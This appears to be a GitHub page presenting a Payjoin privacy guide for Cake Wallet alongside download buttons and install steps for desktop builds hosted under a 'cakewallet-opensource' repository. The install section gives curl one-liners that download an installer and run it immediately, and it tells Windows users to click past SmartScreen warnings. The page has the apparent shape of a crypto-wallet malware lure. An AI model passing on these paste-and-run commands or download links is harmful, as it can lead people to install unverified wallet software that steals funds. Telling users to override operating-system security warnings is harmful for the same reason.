![Cake Wallet payjoin bitcoin guide](assets/cake-wallet-payjoin-bitcoin-article-banner.png)

# Payjoin in Cake Wallet for Bitcoin Privacy

Why a payment that looks ordinary is the point, and what it needs to work.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Payjoin lets the receiver contribute an input, so the transaction no longer looks like a simple payment and the amount is harder to infer. The sender needs a counterparty whose wallet supports it, and the payment costs a little more in fees. It is a Bitcoin feature, and it works on-chain rather than through a server.

<!-- ARTICLE-BODY-BEGIN -->

## What Payjoin changes
A normal Bitcoin payment has a tell: one input, one or two outputs, and the amount visible. Payjoin breaks that pattern by having the receiver add an input, which makes the transaction look like a transfer between addresses the analysis cannot attribute.

The gain is modest and real: it hides which output was the payment and weakens the assumption that one input means one payer. It does not hide that a transaction happened, and it does not make an address reusable.

## What Payjoin needs
Both sides must support it. If the receiver's wallet cannot participate, the payment falls back to an ordinary transaction, and the sender usually cannot tell in advance. That dependency is why Payjoin is a privacy improvement rather than a guarantee.

A payment to an exchange or a merchant with a fixed deposit flow will not be a Payjoin. Choosing when it applies is part of using it well.

## The fee it costs
A Payjoin transaction has an extra input and often an extra output, so it is larger than a plain payment and costs more in fees. On a busy day that difference is visible; on a quiet one it is small.

Fee level and Payjoin interact, because a higher fee can make the payment confirm faster while costing more for the larger transaction. <a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-network-fee.md">Cake Wallet network fee</a> explains how the levels map to confirmation time.

## How it differs from Silent Payments
Silent Payments solve address reuse: one published address, a fresh output for every sender. Payjoin solves transaction shape: a payment that does not look like one.

They address different leaks and can be used together. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-silent-payments.md">Cake Wallet Silent Payments</a> covers the address side, including why the sender's wallet must support it too.

## Signing and verifying messages
Proving control of an address without moving funds is a separate tool: sign a message with the wallet that holds the key, and the other side verifies it. It is not a privacy feature and it reveals that the address is yours, which is the point when you need to prove it.

Coin selection and message signing both live on the send side of the app. <a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-coin-control.md">Coin control in Cake Wallet</a> covers the input side of the same screen.

## Verify your build
Payjoin availability depends on the build, and a version that does not ship it will simply offer an ordinary send. Check the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">current Cake Wallet release</a> and confirm your app is current before you conclude the feature is missing.

If the option is there but the payment still goes out as a normal transaction, the counterparty did not participate. That is expected behaviour, not a failure.

## FAQ
### What is Payjoin?
A Bitcoin payment where the receiver adds an input, so the transaction does not look like a simple payment.
### What is an address lookup service?
A service the wallet can query to attach a name to an address. It reveals the address you are looking up to that service.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[Cake Wallet Silent Payments](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-silent-payments.md) · [coin control in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-coin-control.md) · [Cake Wallet network fee](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-network-fee.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
